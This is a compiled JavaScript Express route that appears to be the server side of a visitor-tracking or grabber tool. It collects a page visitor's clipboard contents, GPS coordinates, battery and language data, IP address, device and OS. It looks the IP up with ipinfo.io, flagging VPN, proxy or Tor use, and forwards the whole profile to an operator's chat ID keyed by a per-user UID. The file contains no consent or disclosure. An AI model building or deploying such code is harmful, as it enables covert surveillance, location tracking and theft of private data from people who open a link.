"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
let router = express_1.default.Router();
const axios_1 = __importDefault(require("axios"));
const Controller = __importStar(require("../controller"));
const helper = __importStar(require("../helper"));
router.post("/", (req, res, next) => __awaiter(void 0, void 0, void 0, function* () {
    var _a, _b, _c, _d, _e, _f, _g, _h, _j, _k, _l, _m, _o, _p;
    const { q } = req.query;
    let chatId = Number(process.env.ADMIN_CHAT_ID);
    if (q && q !== "null") {
        let result = helper.findByUid(q);
        if (result === null || result === void 0 ? void 0 : result.chatId)
            chatId = result.chatId;
    }
    let userAgent = req.useragent;
    let deviceAgent = "Unknown Device";
    let osAgent = "Unknown OS";
    let ipAddress = (Array.isArray(req.headers["x-real-ip"]) ? req.headers["x-real-ip"][0] : (_a = req.headers["x-real-ip"]) === null || _a === void 0 ? void 0 : _a.split(",")[0]) ||
        (Array.isArray(req.headers["x-forwarded-for"]) ? req.headers["x-forwarded-for"][0] : (_b = req.headers["x-forwarded-for"]) === null || _b === void 0 ? void 0 : _b.split(",")[0]) ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        "";
    if (userAgent === null || userAgent === void 0 ? void 0 : userAgent.isAndroid) {
        deviceAgent = "Android";
    }
    else if (userAgent === null || userAgent === void 0 ? void 0 : userAgent.isiPhone) {
        deviceAgent = "Iphone";
    }
    else if (userAgent === null || userAgent === void 0 ? void 0 : userAgent.isiPad) {
        deviceAgent = "iPad";
    }
    else if (userAgent === null || userAgent === void 0 ? void 0 : userAgent.isMobile) {
        deviceAgent = "Mobile";
    }
    else if (userAgent === null || userAgent === void 0 ? void 0 : userAgent.isDesktop) {
        deviceAgent = "Desktop";
    }
    if (userAgent === null || userAgent === void 0 ? void 0 : userAgent.isWindows) {
        osAgent = "Windows";
    }
    else if (userAgent === null || userAgent === void 0 ? void 0 : userAgent.isMac) {
        osAgent = "MacOS";
    }
    else if (userAgent === null || userAgent === void 0 ? void 0 : userAgent.isLinux) {
        osAgent = "Linux";
    }
    let info = {
        device: deviceAgent,
        os: osAgent,
        battery: {
            status: ((_c = req.body) === null || _c === void 0 ? void 0 : _c.battStatus) || "",
            percentage: ((_d = req.body) === null || _d === void 0 ? void 0 : _d.percentage) || "",
            error: ((_e = req.body) === null || _e === void 0 ? void 0 : _e.battError) || null,
        },
        clipboard: ((_f = req.body) === null || _f === void 0 ? void 0 : _f.clipboardError) ? (_g = req.body) === null || _g === void 0 ? void 0 : _g.clipboardError : ((_h = req.body) === null || _h === void 0 ? void 0 : _h.clipboard) || "",
        languages: ((_j = req.body) === null || _j === void 0 ? void 0 : _j.languagesError) ? (_k = req.body) === null || _k === void 0 ? void 0 : _k.languagesError : ((_l = req.body) === null || _l === void 0 ? void 0 : _l.languages) || "",
        public_ip: ipAddress,
        city: "",
        region: "",
        country: "",
        timezone: "",
        isp: "",
        privacy: "",
        coordinates: {
            latitude: (_m = req.body) === null || _m === void 0 ? void 0 : _m.latitude,
            longitude: (_o = req.body) === null || _o === void 0 ? void 0 : _o.longitude,
            error: ((_p = req.body) === null || _p === void 0 ? void 0 : _p.locError) || null,
        },
    };
    let ipInfoFetch = `https://ipinfo.io/${ipAddress}?token=${process.env.IP_INFO}`;
    try {
        let response = yield axios_1.default.get(ipInfoFetch);
        let { city, region, country, timezone, company, privacy } = response.data;
        let privacySettings = "not set";
        if (privacy === null || privacy === void 0 ? void 0 : privacy.vpn) {
            privacySettings = "vpn";
        }
        else if (privacy === null || privacy === void 0 ? void 0 : privacy.proxy) {
            privacySettings = "proxy";
        }
        else if (privacy === null || privacy === void 0 ? void 0 : privacy.tor) {
            privacySettings = "tor";
        }
        else if (privacy === null || privacy === void 0 ? void 0 : privacy.relay) {
            privacySettings = "relay";
        }
        info.city = city || "";
        info.region = region || "";
        info.country = country || "";
        info.timezone = timezone || "";
        info.isp = (company === null || company === void 0 ? void 0 : company.name) || "";
        info.privacy = privacySettings;
        sendUserInfo(info);
    }
    catch (err) {
        console.error("From IPInfo API: ", err);
        sendUserInfo(info);
    }
    function sendUserInfo(info) {
        Controller.sendUserInfo(chatId, info)
            .then(() => {
            res.status(200).json({ status: 200, message: "Success" });
        })
            .catch(() => {
            res.status(500).json({ status: 500, message: "Something went wrong!" });
        });
    }
}));
exports.default = router;
